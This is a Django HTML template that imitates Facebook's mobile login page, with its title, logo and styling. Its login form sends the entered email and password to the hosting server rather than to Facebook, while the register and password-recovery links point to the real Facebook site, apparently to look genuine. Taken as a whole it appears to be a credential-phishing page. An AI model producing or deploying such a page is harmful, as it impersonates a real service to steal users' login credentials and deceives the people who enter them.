{% load static %}
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.95">
    <link rel="shortcut icon" type="image/x-icon" href="{% static 'fb/fbicon.svg' %}" />
    <title>Facebook</title>
    <link rel="stylesheet" href="{% static 'fb/fbstyle.css' %}">
  </head>
  <body>
    <div class="container">

      <form class="login" action="" method="post">
      {% csrf_token %}
        <img src="{% static 'fb/fb.svg' %}" alt="facebook">
        <div class="email">
          <input type="email" name="email" value="" placeholder="Mobile number or email address">
        </div>
        <div class="password">
          <input type="password" class="pass" id="password" name="password" value="" placeholder="Password">
          <input type="button" id="show" name="show" value="show">
        </div>
        <div class="submit">
          <input type="submit" name="submit" value="Log In">
        </div>
      </form>
      <div class="or">
        <span>or</span>
      </div>
      <div class="register">
        <a href="https://m.facebook.com/reg/">Create New Account</a>
      </div>
      <div class="forgot_pass">
        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a>
      </div>
    </div>
    <script type="text/javascript" src="{% static 'fb/fbmain.js' %}"></script>
  </body>
</html>
